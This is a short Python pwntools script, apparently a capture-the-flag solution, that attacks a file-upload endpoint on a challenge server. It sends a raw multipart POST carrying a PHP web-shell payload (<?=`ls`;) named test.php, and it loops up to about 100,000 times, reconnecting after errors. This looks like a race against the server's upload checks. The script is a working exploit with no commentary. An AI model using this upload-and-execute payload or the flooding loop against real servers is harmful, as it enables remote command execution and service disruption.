from pwn import *

context.log_level = 'error'

data="""POST /upload.php HTTP/1.1
Host: challs2.welcomectf.tk:5207
Content-Length: 339
Cache-Control: max-age=0
Upgrade-Insecure-Requests: §1§
Origin: http://172.20.188.3:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySFEO1XJPBoivDYvw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.20.188.3:8080/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

------WebKitFormBoundarySFEO1XJPBoivDYvw
Content-Disposition: form-data; name="upload_file"; filename="test.php"
Content-Type: application/octet-stream

<?=`ls`;
------WebKitFormBoundarySFEO1XJPBoivDYvw
Content-Disposition: form-data; name="submit"

greyhats{trust_me_this_is_not_flag}
------WebKitFormBoundarySFEO1XJPBoivDYvw--
"""

data = data.replace("\n","\r\n")

r = remote("challs2.welcomectf.tk",5207)

for i in range(1,100000):
    try:
        r.sendline(data.encode())
        r.recv()
    except:
        r.close()
        r = remote("challs2.welcomectf.tk",5207)
        #print("re-establish connection")
        continue
